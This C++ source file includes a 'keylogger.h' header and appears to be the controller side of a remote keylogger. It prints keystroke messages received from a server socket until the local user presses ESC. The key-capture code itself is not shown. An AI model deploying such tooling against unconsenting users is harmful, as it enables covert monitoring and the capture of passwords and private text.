#include "keylogger.h"

bool receiveKeyPress(int &clientSd)
{
	cout << "Catching key pressed until you press `ESC`\n";
	const char *dev_path = "/dev/input/event1";
	int fd = open(dev_path, O_RDONLY);
	if (fd < 0)
	{
		std::cerr << "Could not open device file." << std::endl;
		return 0;
	}
	bool kt = 1 , stopListening = 0;
	auto listenFromServer = [&kt, &clientSd, &stopListening]()
	{
		char msg[50];
		while (1)
		{
			memset(&msg, 0, sizeof(msg));

			int byteRecv = recv(clientSd, (char *)&msg, sizeof(msg), 0); // receive message
			if (byteRecv <= 0 || stopListening == 1)
			{
				// kt = 0;
				cout << "Stop listen from the Server\n";
				kt = 0;
				return;
			}

			fflush(stdin);
			//cout << "MEOMEO";
			cout << msg << "\n";
			fflush(stdin);
		}
		return;
	};

	auto listenFromClientKeyboard = [&clientSd, &fd]()
	{
		while (1)
		{

			struct input_event ev;
			ssize_t n = read(fd, &ev, sizeof(ev));
			if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1 && ev.code == 1)
			{
				memset(&ev, 0, sizeof(ev));
				string temp = "exit";
				char msg[10];
				memset(msg, 0, sizeof msg);
				strcpy(msg, temp.c_str());
				send(clientSd, (char *)&msg, strlen(msg), 0);
				break;
			}
		}
		refresh();
		return;
	};

	thread func1(listenFromServer);
	func1.detach();

	thread func2(listenFromClientKeyboard);

	func2.join();
	stopListening = 1;
	// std::this_thread::sleep_for(std::chrono::milliseconds(500));

	close(fd);
	cout << "Stop catching key pressed\n";
	cout << "---------------------------\n";
	
	char x[1000];
	fflush(stdin);
	cout << "Enter to continue.\n";
	cin.getline(x , 1000);
	
	fflush(stdin);
	memset(x , 0 , sizeof x);
	
	return kt;
}
